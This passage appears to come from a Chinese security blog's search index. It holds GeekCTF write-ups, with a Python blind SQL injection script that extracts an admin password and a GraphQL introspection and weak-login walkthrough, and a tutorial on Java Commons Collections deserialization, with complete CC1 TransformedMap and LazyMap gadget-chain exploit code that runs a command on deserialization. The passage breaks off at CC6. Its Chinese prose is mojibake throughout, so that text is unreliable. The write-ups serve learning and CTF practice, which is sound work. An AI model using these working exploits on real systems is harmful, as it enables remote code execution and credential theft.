ä¸ºNODE_NDEBUG=1å¯ä»¥ç›´æ¥å¿½è§†require(&#39;assert-plus&#39;) æ¥ä¸‹æ¥æ˜¯&#x2F;comment&#x2F;likeå‡ºæœ‰ä¸€ä¸ªæŠŠæ‰€æœ‰å‚æ•°éƒ½æ³¨å…¥åˆ°æŸ¥è¯¢è¯­å¥çš„æŸ¥è¯¢ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªæ³¨å…¥ç‚¹ 123456æ­£å¸¸æƒ…å†µ ?post_id=1db.all(`SELECT * FROM comments WHERE post_id = ?`, [&quot;1&quot;]);?post_id=1&amp;inject=1db.all(`SELECT * FROM comments WHERE post_id = ? AND inject = ?`, [&quot;1&quot;, &quot;1&quot;]);?post_id=1&amp;%271%27+%3D+%271%27+OR+%271%27=1 å³post_id=1&amp; &#x27;1&#x27; = &#x27;1&#x27; OR &#x27;1&#x27; = 1db.all(`SELECT * FROM comments WHERE post_id = ? AND &#x27;1&#x27; = &#x27;1&#x27; OR &#x27;1&#x27; = ?`, [&quot;1&quot;, &quot;1&quot;]); æ³¨å…¥æ–¹å¼ï¼š 1SELECT * FROM comments WHERE (SELECT password from admins) LIKE content AND &#x27;1&#x27; = ? å…ˆå†™ä¸€å †å½¢å¦‚____________a____...ã€_____b__________...çš„è¯„è®ºï¼Œç„¶åæ‰§è¡Œä¸Šè¿°è¯­å¥ï¼ŒæŸ¥çœ‹å“ªä¸ªlikeå¢åŠ  ç»™å‡ºæœ€åçš„payloadï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import requestsimport threadingimport reurl = &quot;http://c4b2vk76v4jj6gy2.instance.chall.geekctf.geekcon.top:18080&quot;hexchars = &quot;0123456789abcdef&quot;def new_comment(char): for p in range(32): requests.get(url + &quot;/comment/new&quot;, params=&#123; &quot;post_id&quot;: &#x27;1&#x27;, &quot;name&quot;: &quot;a&quot;, &quot;content&quot;: &quot;_&quot; * p + char + &quot;_&quot; * (31-p) &#125;, allow_redirects=False)thread=[]for c in hexchars: t = threading.Thread(target=new_comment, args=(c,)) thread.append(t) t.start()for t in thread: t.join()print(&quot;è¯„è®ºæ·»åŠ å®Œæˆï¼&quot;)times = 0def find_flag(): global times times += 1 requests.get(url + &quot;/comment/like/&quot;, params=&#123; &quot;post_id&quot;: &#x27;1&#x27;, &quot;&#x27;1&#x27; = &#x27;1&#x27; AND (SELECT password from admins) LIKE content AND &#x27;1&#x27;&quot;: &quot;1&quot; &#125;, allow_redirects=False) res = requests.get(url + &quot;/post/1&quot;).text ans = [ p.partition(&quot;&lt;/li&gt;&quot;)[0][90:][:32] for p in res.split(&quot;&lt;li&gt;&quot;) if &quot;&#123;&#125; Likes&quot;.format(times) in p ] sorted(ans) passwd = &quot;&quot; for i in range(32): for j in range(32): if ans[i][j] != &quot;_&quot;: passwd += ans[i][j] break print(&quot;å¯†ç ä¸ºï¼š&quot;,passwd) res = requests.get(url + &quot;/admin&quot;, params=&#123; &quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: passwd &#125;) return reswhile True: print(times) res = find_flag() if &quot;flag&quot; in res.text: print(&quot;flag:&quot;, re.findall(&quot;flag&#123;.*?&#125;&quot;, res.text)[0]) break flag: flag&#123;BL1nd_5ql_!NJeC71on_1S_PoS5ib13_W17h_0nLy_4_9ueRiE5&#125; mdå›å¤´ä¸€çœ‹ä¹Ÿä¸æ˜¯ç‰¹åˆ«éš¾å•Šï¼Œä¸»è¦æ˜¯å½“æ—¶çœ‹äº†ä¸€çœ¼å°±ç›´æ¥æ‹¿ä¸»æœºè°ƒnodejsäº†ï¼Œæ²¡æ­dockerå¯¼è‡´commentå¤„æ— æ³•æ³¨å…¥ï¼Œä¸è¿‡è¯è¯´æˆ‘æ‹¿winæœºcmdç›´æ¥è¾“å…¥npm startä¸ºå•¥æ³¨å…¥ä¸äº†å‘¢ï¼Œå¥½å¥‡æ€ªï¼Œä¸‹æ¬¡ä¸€å®šè®°å¾—æ­dockerï¼ˆè¡€çš„æ•™è®­ï¼‰ ECommerceï¼ˆå¤ç°ï¼‰æ²¡æ€ä¹ˆçœ‹çš„ä¸€é“é¢˜ æ‰“å¼€ç½‘ç«™æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œç™»å½•æŠ“ä¸ªåŒ…çœ‹çœ‹ï¼Œå‘ç°Graphqlè¯·æ±‚ 123456789mutation MyMutation &#123; tokenCreate(email: &quot;admin&quot;, password: &quot;123456&quot;) &#123; errors &#123; code message &#125; token &#125;&#125; æ ¹æ®æ¸—é€æµ‹è¯•ä¹‹graphQL_graphql æ¼æ´ï¼Œé€šè¿‡IntrospectionQuery å¯ä»¥æŸ¥è¯¢åˆ°å…¶ä¸­çš„å…¨éƒ¨ä¿¡æ¯ 1&#123;&quot;query&quot;:&quot;\\n query IntrospectionQuery &#123;\\r\\n __schema &#123;\\r\\n queryType &#123; name &#125;\\r\\n mutationType &#123; name &#125;\\r\\n subscriptionType &#123; name &#125;\\r\\n types &#123;\\r\\n ...FullType\\r\\n &#125;\\r\\n directives &#123;\\r\\n name\\r\\n description\\r\\n locations\\r\\n args &#123;\\r\\n ...InputValue\\r\\n &#125;\\r\\n &#125;\\r\\n &#125;\\r\\n &#125;\\r\\n\\r\\n fragment FullType on __Type &#123;\\r\\n kind\\r\\n name\\r\\n description\\r\\n fields(includeDeprecated: true) &#123;\\r\\n name\\r\\n description\\r\\n args &#123;\\r\\n ...InputValue\\r\\n &#125;\\r\\n type &#123;\\r\\n ...TypeRef\\r\\n &#125;\\r\\n isDeprecated\\r\\n deprecationReason\\r\\n &#125;\\r\\n inputFields &#123;\\r\\n ...InputValue\\r\\n &#125;\\r\\n interfaces &#123;\\r\\n ...TypeRef\\r\\n &#125;\\r\\n enumValues(includeDeprecated: true) &#123;\\r\\n name\\r\\n description\\r\\n isDeprecated\\r\\n deprecationReason\\r\\n &#125;\\r\\n possibleTypes &#123;\\r\\n ...TypeRef\\r\\n &#125;\\r\\n &#125;\\r\\n\\r\\n fragment InputValue on __InputValue &#123;\\r\\n name\\r\\n description\\r\\n type &#123; ...TypeRef &#125;\\r\\n defaultValue\\r\\n &#125;\\r\\n\\r\\n fragment TypeRef on __Type &#123;\\r\\n kind\\r\\n name\\r\\n ofType &#123;\\r\\n kind\\r\\n name\\r\\n ofType &#123;\\r\\n kind\\r\\n name\\r\\n ofType &#123;\\r\\n kind\\r\\n name\\r\\n ofType &#123;\\r\\n kind\\r\\n name\\r\\n ofType &#123;\\r\\n kind\\r\\n name\\r\\n ofType &#123;\\r\\n kind\\r\\n name\\r\\n ofType &#123;\\r\\n kind\\r\\n name\\r\\n &#125;\\r\\n &#125;\\r\\n &#125;\\r\\n &#125;\\r\\n &#125;\\r\\n &#125;\\r\\n &#125;\\r\\n &#125;\\r\\n &quot;,&quot;variables&quot;:null&#125; ä½¿ç”¨graphiql&#x2F;examples&#x2F;graphiql-cdn&#x2F;index.html at main Â· graphql&#x2F;graphiqlæ‰“å¼€ï¼Œæœ‰äº†docså’Œapi å¯¹å…¶ä¸­shopå­—æ®µnameè¿›è¡Œè¯·æ±‚ï¼Œå¾—åˆ°Saleor e-commerce GitHubç›´æ¥èƒ½æœåˆ°Saleor Commerceï¼Œè¿™é‡Œå¼•ç”¨å®˜æ–¹wpçš„ä¸€å¼ å›¾æ¥æè¿°å…¶æ¶æ„ ä¸‹è½½å‰ç«¯saleor&#x2F;storefrontï¼Œå°†.envå¤„å¡«å…¥åç«¯åœ°å€ï¼Œnpm run devç›´æ¥è·‘èµ·æ¥ éšä¾¿æ‰¾æ‰¾å‘ç°about æ ¹æ®hint1åœ¨ä¹‹å‰çš„IntrospectionQuery è¿”å›åŒ…å¯ä»¥æ‰¾åˆ°flag1ï¼šChannel-specific tax configuration.\\n\\nAdded in Saleor 3.9.ğŸ‰ Congratulations! You find flag part 1: ZmxhZ3s5ckBQSH ğŸ‰ æ ¹æ®hint2ï¼Œåœ¨ä¹‹å‰çš„graphqlä¸­æœproductï¼Œå…¶ä¸­seoDescriptionæœ‰flag2ï¼šğŸ‰ Congratulations! You find flag part 2: ExX0BQIV8zWHğŸ‰ 123456query MyQuery &#123; product(channel: &quot;default-channel&quot;, slug: &quot;the-dash-cushion&quot;) &#123; seoTitle seoDescription &#125;&#125; æ¥ä¸‹æ¥æ˜¯ç½‘ç«™å­˜åœ¨æºä»£ç æ³„éœ²ï¼ŒåŸç½‘ç«™src&#x2F;pages&#x2F;index.tsxä¸­å­˜åœ¨é‚®ç®±david@deepshop.coï¼Œé…åˆå¼±å£ä»¤123456å¯ä»¥ç›´æ¥ç™»å½•ï¼ˆç¥å¥‡çš„æ€è·¯ï¼Œçœ‹å®˜æ–¹wpåŸæ¥æ˜¯ä½œè€…è‡ªå·±åŠ çš„ï¼‰ ç»§ç»­æœ¬åœ°éƒ¨ç½²saleor&#x2F;saleor-dashboardï¼Œä»ç„¶ä»¥davidç™»å½•ï¼Œåœ¨ customer é‡ŒæŠ“åŒ…æœ‰hint3å’Œhint4ï¼ˆå¯èƒ½æ˜¯ç‰ˆæœ¬çš„é—®é¢˜ï¼Œä»è¿™é‡Œå¼€å§‹æˆ‘å¤ç°å¾—éƒ½éå¸¸è‰°éš¾ï¼‰ æ ¹æ®hint3ï¼Œåœ¨Orderä¸­æ‰¾åˆ°è®¢å•ï¼ŒæŠ“åŒ…å‘ç°isgiftå­—æ®µä¸å­˜åœ¨ï¼Œå»æ‰isgifté‡æ–°å‘åŒ…ï¼Œæ‹¿åˆ°flag3ï¼šğŸ‰ Congratulations! You find flag part 3: AwNWU1X0VcLğŸ‰ æ ¹æ®hint4ï¼Œåœ¨ Translations - Chinese - Menu Items - GraphQL API ä¸­æ‰¾åˆ°flag4ï¼šğŸ‰ Congratulations! You find flag part 4: zNyWStoSU45fQ==ğŸ‰ base64è§£ç ï¼Œå‡ºæ¥flagï¼šflag&#123;9r@PHq1_@P!_3Xp05e5_E\\/3rY+hIN9&#125; æ€»ç®—å¤ç°å‡ºæ¥äº†ï¼Œå…‰æ˜¯å¤ç°å°±èŠ±äº†æˆ‘å¥½é•¿æ—¶é—´ï¼Œä¸€é“å¾ˆæ–°é¢–çš„æ¸—é€é¢˜","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://blog.lazyforever.top/categories/WriteUp/"}],"tags":[{"name":"web","slug":"web","permalink":"https://blog.lazyforever.top/tags/web/"}]},{"title":"Javaååºåˆ—åŒ–CCé“¾","slug":"2024CClearn","date":"2024-02-23T11:43:12.000Z","updated":"2024-02-24T08:06:58.221Z","comments":true,"path":"2024/02/23/2024CClearn/","link":"","permalink":"https://blog.lazyforever.top/2024/02/23/2024CClearn/","excerpt":"","text":"å‰è¨€ç»å…¸çš„Javaååºåˆ—åŒ–æ¼æ´ æ¼æ´ä¸»è¦é›†ä¸­äºApache Commons Collectionsç»„ä»¶ï¼Œå…¶å†…éƒ¨å°è£…äº†è®¸å¤šæ–¹æ³•ç”¨æ¥æ–¹ä¾¿å¼€å‘äººå‘˜ä½¿ç”¨ã€‚ org.apache.commons.collections â€“ CommonsCollectionsè‡ªå®šä¹‰çš„ä¸€ç»„å…¬ç”¨çš„æ¥å£å’Œå·¥å…·ç±» org.apache.commons.collections.bag â€“ å®ç°Bagæ¥å£çš„ä¸€ç»„ç±» org.apache.commons.collections.bidimap â€“ å®ç°BidiMapç³»åˆ—æ¥å£çš„ä¸€ç»„ç±» org.apache.commons.collections.buffer â€“ å®ç°Bufferæ¥å£çš„ä¸€ç»„ç±» org.apache.commons.collections.collection â€“å®ç°java.util.Collectionæ¥å£çš„ä¸€ç»„ç±» org.apache.commons.collections.comparatorsâ€“ å®ç°java.util.Comparatoræ¥å£çš„ä¸€ç»„ç±» org.apache.commons.collections.functors â€“Commons Collectionsè‡ªå®šä¹‰çš„ä¸€ç»„åŠŸèƒ½ç±» org.apache.commons.collections.iterators â€“ å®ç°java.util.Iteratoræ¥å£çš„ä¸€ç»„ç±» org.apache.commons.collections.keyvalue â€“ å®ç°é›†åˆå’Œé”®&#x2F;å€¼æ˜ å°„ç›¸å…³çš„ä¸€ç»„ç±» org.apache.commons.collections.list â€“ å®ç°java.util.Listæ¥å£çš„ä¸€ç»„ç±» org.apache.commons.collections.map â€“ å®ç°Mapç³»åˆ—æ¥å£çš„ä¸€ç»„ç±» org.apache.commons.collections.set â€“ å®ç°Setç³»åˆ—æ¥å£çš„ä¸€ç»„ç±» ç¯å¢ƒæ­å»ºä¸»è¦ä½¿ç”¨äº†jdk8u65ï¼ŒCommons Collections&lt;&#x3D;3.2.1ï¼ŒCommons Collections4.0 CCé“¾åˆ†æCC1æ¼æ´å½±å“ï¼šCommons Collections&lt;&#x3D;3.2.1 jdk&lt;8u71 é¦–å…ˆéœ€è¦å…³æ³¨çš„æ˜¯Transformeræ¥å£ï¼Œå…¶é€»è¾‘å¦‚ä¸‹ï¼Œä¸»è¦æ˜¯ç”¨æ¥æ¥æ”¶ä¸€ä¸ªå¯¹è±¡å°†å…¶è¿›è¡Œè½¬åŒ– 123public interface Transformer &#123; public Object transform(Object input);&#125; å…¶æ¥å£å…·æœ‰å‡ ä¸ªå…³é”®çš„å®ç°ç±» é¦–å…ˆæ˜¯ConstantTransformerç±»ï¼Œå…¶transformå‡½æ•°æ˜¯æ¥æ”¶ä»»æ„å¯¹è±¡ï¼Œè¿”å›ä¸€ä¸ªå¸¸é‡ï¼Œå…³é”®ä»£ç å¦‚ä¸‹ 12345678910public class ConstantTransformer implements Transformer, Serializable &#123; private final Object iConstant; public ConstantTransformer(Object constantToReturn) &#123; super(); iConstant = constantToReturn; &#125; public Object transform(Object input) &#123; return iConstant; &#125;&#125; InvokerTransformerç±»ï¼Œtransformæ–¹æ³•é€šè¿‡åå°„å®ç°å¯¹æ¥æ”¶å¯¹è±¡ä»»æ„æ–¹æ³•ä»»æ„å‚æ•°çš„è°ƒç”¨ï¼Œä¹Ÿæ˜¯CC1é“¾ä¸­æœ€åæ‰§è¡Œå‘½ä»¤çš„ä½ç½®ï¼Œå…³é”®ä»£ç å¦‚ä¸‹ 1234567891011121314151617public class InvokerTransformer implements Transformer, Serializable &#123; private final String iMethodName; private final Class[] iParamTypes; private final Object[] iArgs; public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); &#125; catch (...Exception ex) &#123; throw ...; &#125; &#125;&#125; ChainedTransformerç±»ï¼Œå…¶å†…éƒ¨æœ‰ä¸€ä¸ªå­˜å‚¨Transformerç±»çš„æ•°ç»„ï¼Œå¯¹æ¥æ”¶çš„å¯¹è±¡ä»¥æ­¤è°ƒç”¨æ•°ç»„ä¸­çš„transformï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š 12345678910111213public class ChainedTransformer implements Transformer, Serializable &#123; private final Transformer[] iTransformers; public ChainedTransformer(Transformer[] transformers) &#123; super(); iTransformers = transformers; &#125; public Object transform(Object object) &#123; for (int i = 0; i &lt; iTransformers.length; i++) &#123; object = iTransformers[i].transform(object); &#125; return object; &#125;&#125; åœ¨äº†è§£äº†ä»¥ä¸Šåï¼Œæˆ‘ä»¬å¯ä»¥è½»æ¾çš„å†™å‡ºåˆæ­¥çš„å‘½ä»¤æ‰§è¡Œ 123Runtime r = Runtime.getRuntime();InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;calc&quot;&#125;);invokerTransformer.transform(r); æ¥ä¸‹æ¥éœ€è¦å»å¯»æ‰¾å®Œæ•´è°ƒç”¨é“¾ï¼Œå³å¯»æ‰¾è°ƒç”¨transformå‡½æ•°çš„å…¶ä»–ç±» TransformedMapé“¾æˆ‘ä»¬æ³¨æ„åˆ°TransformedMapç±»ï¼Œå…¶checkSetValueå‡½æ•°ä¸­è°ƒç”¨äº†transformæ–¹æ³•ï¼ŒTransformedMapç±»çš„å…³é”®ä»£ç å¦‚ä¸‹ 123456789101112131415public class TransformedMap extends AbstractInputCheckedMapDecorator implements Serializable &#123; protected final Transformer keyTransformer; protected final Transformer valueTransformer; public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123; return new TransformedMap(map, keyTransformer, valueTransformer); &#125; protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123; super(map); this.keyTransformer = keyTransformer; this.valueTransformer = valueTransformer; &#125; protected Object checkSetValue(Object value) &#123; return valueTransformer.transform(value); &#125;&#125; æ¥ä¸‹æ¥è¦å¯»æ‰¾å“ªä¸ªç±»çš„æ–¹æ³•è°ƒç”¨äº†checkSetValueå‡½æ•°ï¼Œç»è¿‡æŸ¥æ‰¾ååªæœ‰ä¸€å¤„ï¼Œä¸ºAbstractInputCheckedMapDecoratorç±»çš„å†…éƒ¨ç±»MapEntryçš„setValueæ–¹æ³•ï¼ŒMapEntryç±»ä½œç”¨æ˜¯éå†æ•´ä¸ªMapï¼Œå…¶æ¯æ¬¡ä¼šå­˜å‚¨ä¸€ä¸ªé”®å€¼å¯¹ï¼ŒsetValueæ–¹æ³•å…¶å®æ˜¯é‡å†™äº†AbstractMapEntryDecoratorç±»çš„setValue 1234567891011static class MapEntry extends AbstractMapEntryDecorator &#123; private final AbstractInputCheckedMapDecorator parent; protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) &#123; super(entry); this.parent = parent; &#125; public Object setValue(Object value) &#123; value = parent.checkSetValue(value); return entry.setValue(value); &#125;&#125; æ­¤æ—¶ï¼Œå¯ä»¥å†™å‡ºæ›´è¿›ä¸€æ­¥çš„å‘½ä»¤æ‰§è¡Œæ–¹å¼ 12345678Runtime r = Runtime.getRuntime();InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;calc&quot;&#125;);HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();map.put(&quot;key&quot;, &quot;value&quot;);Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, null, invokerTransformer);for(Map.Entry entry: transformedMap.entrySet())&#123; entry.setValue(r);&#125; æœ€åï¼Œéœ€è¦å»å¯»æ‰¾ä¸€ä¸ªå¯ä»¥é€šè¿‡readObjectæ–¹æ³•è°ƒç”¨åˆ°setValueå‡½æ•°çš„ç±» æ³¨æ„åˆ°AnnotationInvocationHandlerç±»çš„readObjectæ–¹æ³•æœ‰å’Œä¸Šé¢å‘½ä»¤æ‰§è¡Œç±»ä¼¼çš„ä»£ç ï¼Œå…¶ä¸»è¦ä»£ç å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031class AnnotationInvocationHandler implements InvocationHandler, Serializable &#123; private final Class&lt;? extends Annotation&gt; type; private final Map&lt;String, Object&gt; memberValues; AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123; Class&lt;?&gt;[] superInterfaces = type.getInterfaces(); if (!type.isAnnotation() || superInterfaces.length != 1 || superInterfaces[0] != java.lang.annotation.Annotation.class) throw ...; this.type = type; this.memberValues = memberValues; &#125; private void readObject(java.io.ObjectInputStream s) throws ... &#123; s.defaultReadObject(); AnnotationType annotationType = null; try &#123; annotationType = AnnotationType.getInstance(type); &#125; catch(IllegalArgumentException e) &#123; throw ...; &#125; Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123; String name = memberValue.getKey(); Class&lt;?&gt; memberType = memberTypes.get(name); if (memberType != null) &#123; Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) &#123; memberValue.setValue( new AnnotationTypeMismatchExceptionProxy(value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(annotationType.members().get(name)) ); &#125; &#125; &#125; &#125;&#125; ç›®å‰ï¼Œçœ‹èµ·æ¥ä¼¼ä¹å·²ç»æ‰¾åˆ°äº†ä¸€ä¸ªå®Œæ•´çš„è°ƒç”¨é“¾ï¼Œä½†å…¶å®è¿˜å­˜åœ¨å‡ ä¸ªé—®é¢˜ é¦–å…ˆæ˜¯Runtimeæœªç»§æ‰¿åºåˆ—åŒ–æ¥å£ï¼Œæ— æ³•åºåˆ—åŒ–ï¼Œå¯¹æ­¤çš„è§£å†³æ–¹æ¡ˆæ˜¯é€šè¿‡å¯¹Runtime.classè¿›è¡Œåå°„æ¥æ‰§è¡Œä»£ç ï¼Œå› æ­¤éƒ¨åˆ†ä»£ç å¯ä»¥ä¿®æ”¹ä¸º 1234567Transformer[] transformers = &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); æ¥ç€æ˜¯ç»•è¿‡AnnotationInvocationHandler.readObjectæ–¹æ³•çš„å‡ ä¸ªifåˆ¤æ–­ï¼Œéœ€è¦å°†ä¼ è¿›å»çš„æ³¨è§£å†…å®¹ä¸keyç›¸åŒã€‚ æœ€åæ˜¯setValueçš„å‚æ•°æ— æ³•æ§åˆ¶çš„é—®é¢˜ï¼Œä¸Šé¢å·²ç»ç»™å‡ºäº†æ–¹å¼ï¼Œå°±æ˜¯é€šè¿‡ConstantTransformerç±»æ¥è¿”å›å›ºå®šçš„å¯¹è±¡ã€‚ äºæ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥å†™å‡ºå®Œæ•´çš„CC1 TransformedMapé“¾ä»£ç  12345678910111213141516171819202122232425262728293031public class CC1 &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123; Transformer[] transformers = &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); map.put(&quot;value&quot;, &quot;value&quot;); Map transformedMap = TransformedMap.decorate(map, null, chainedTransformer); Constructor&lt;?&gt; declaredConstructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class); declaredConstructor.setAccessible(true); Object o = declaredConstructor.newInstance(Retention.class, transformedMap); serialize(o); deserialize(&quot;hack.bin&quot;); &#125; public static Object deserialize(String filename) throws IOException, ClassNotFoundException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object o = ois.readObject(); return o; &#125; public static void serialize(Object o) throws IOException &#123; FileOutputStream fileOutputStream = new FileOutputStream(&quot;hack.bin&quot;); ObjectOutputStream out = new ObjectOutputStream(fileOutputStream); out.writeObject(o); out.close(); fileOutputStream.close(); &#125;&#125; LazyMapé“¾ä¸Šé¢æˆ‘ä»¬åˆ†æäº†TransformedMapé“¾çš„å†…å®¹ï¼Œé™¤äº†TransformedMapç±»è°ƒç”¨äº†transformæ–¹æ³•ï¼ŒLazyMapç±»ä¹Ÿè°ƒç”¨äº†transformæ–¹æ³•ã€‚å…¶å…³é”®ä»£ç å¦‚ä¸‹ 123456789101112131415161718192021public class LazyMap extends AbstractMapDecorator implements Map, Serializable &#123; protected final Transformer factory; public static Map decorate(Map map, Transformer factory) &#123; return new LazyMap(map, factory); &#125; protected LazyMap(Map map, Transformer factory) &#123; super(map); if (factory == null) &#123; throw new IllegalArgumentException(&quot;Factory must not be null&quot;); &#125; this.factory = factory; &#125; public Object get(Object key) &#123; if (map.containsKey(key) == false) &#123; Object value = factory.transform(key); map.put(key, value); return value; &#125; return map.get(key); &#125;&#125; æ³¨æ„åˆ°ä¸Šæ–‡æåŠçš„AnnotationInvocationHandlerç±»ä¸­invokeæ–¹æ³•è°ƒç”¨äº†getå‡½æ•°ï¼Œå…¶æ–¹æ³•ä¸»è¦å†…å®¹å¦‚ä¸‹ 123456789101112131415161718192021222324public Object invoke(Object proxy, Method method, Object[] args) &#123; String member = method.getName(); Class&lt;?&gt;[] paramTypes = method.getParameterTypes(); if (member.equals(&quot;equals&quot;) &amp;&amp; paramTypes.length == 1 &amp;&amp; paramTypes[0] == Object.class) return equalsImpl(args[0]); if (paramTypes.length != 0) throw new AssertionError(&quot;Too many parameters for an annotation method&quot;); switch(member) &#123; case &quot;toString&quot;: return toStringImpl(); case &quot;hashCode&quot;: return hashCodeImpl(); case &quot;annotationType&quot;: return type; &#125; Object result = memberValues.get(member); if (result == null) throw new IncompleteAnnotationException(type, member); if (result instanceof ExceptionProxy) throw ((ExceptionProxy) result).generateException(); if (result.getClass().isArray() &amp;&amp; Array.getLength(result) != 0) result = cloneArray(result); return result;&#125; æ¥ä¸‹æ¥éœ€è¦ç»•è¿‡ä¸€äº›ifåˆ¤æ–­ï¼Œæ–¹æ³•åä¸èƒ½ä¸ºtoStringã€hashCodeã€annotationTypeï¼Œä¸”å‚æ•°ä¸ªæ•°å¿…é¡»ä¸º0ã€‚è‡³æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥å†™å‡ºåˆ©ç”¨é“¾åˆæ­¥çš„æ¡†æ¶ 12345678910111213Transformer[] transformers = &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();Map lazyMap = LazyMap.decorate(map, chainedTransformer);Constructor&lt;?&gt; declaredConstructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);declaredConstructor.setAccessible(true);InvocationHandler handler = (InvocationHandler)declaredConstructor.newInstance(Override.class, lazyMap);handler.invoke(null,Class.forName(&quot;java.lang.Object&quot;).getMethod(&quot;wait&quot;),null);//è§¦å‘ç‚¹ invokeæ–¹æ³•å¯ä»¥åœ¨åŠ¨æ€ä»£ç†å†…éƒ¨è§¦å‘ï¼Œåœ¨å¯¹åŠ¨æ€ä»£ç†è°ƒç”¨ä»»æ„æ–¹æ³•æ—¶ï¼Œéƒ½ä¼šé€šè¿‡invokeæ–¹æ³•æ¥å¯¹æ¥æ”¶çš„å¯¹è±¡è¿›è¡Œåå°„è°ƒç”¨ï¼Œè€Œå·§åˆçš„æ˜¯AnnotationInvocationHandlerç±»ä¸­readObjectæ–¹æ³•æœ‰ä¸€å¤„memberValues.entrySet()æ­£å¥½ç¬¦åˆå¯ä»¥ç»•è¿‡ifåˆ¤æ–­çš„éœ€æ±‚ï¼Œå› æ­¤å¯ä»¥å¾—åˆ°å®Œæ•´çš„CC1 LazyMapè°ƒç”¨é“¾ã€‚ 1234567891011121314151617181920212223242526272829303132public class CC1 &#123; public static void main(String[] args) throws Throwable &#123; Transformer[] transformers = &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); Map lazyMap = LazyMap.decorate(map, chainedTransformer); Constructor&lt;?&gt; declaredConstructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class); declaredConstructor.setAccessible(true); InvocationHandler handler = (InvocationHandler)declaredConstructor.newInstance(Override.class, lazyMap); Map m = (Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler); Object o = declaredConstructor.newInstance(Override.class, m); serialize(o); deserialize(&quot;hack.bin&quot;); &#125; public static Object deserialize(String filename) throws IOException, ClassNotFoundException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object o = ois.readObject(); return o; &#125; public static void serialize(Object o) throws IOException &#123; FileOutputStream fileOutputStream = new FileOutputStream(&quot;hack.bin&quot;); ObjectOutputStream out = new ObjectOutputStream(fileOutputStream); out.writeObject(o); out.close(); fileOutputStream.close(); &#125;&#125; CC6æ¼æ´å½±å“ï¼šCommons Collections&lt;&#x3D;3.2.1 jdk1.7,1.8 å½±å“æ¯”è¾ƒå¤§çš„ä¸€æ¡é“¾ 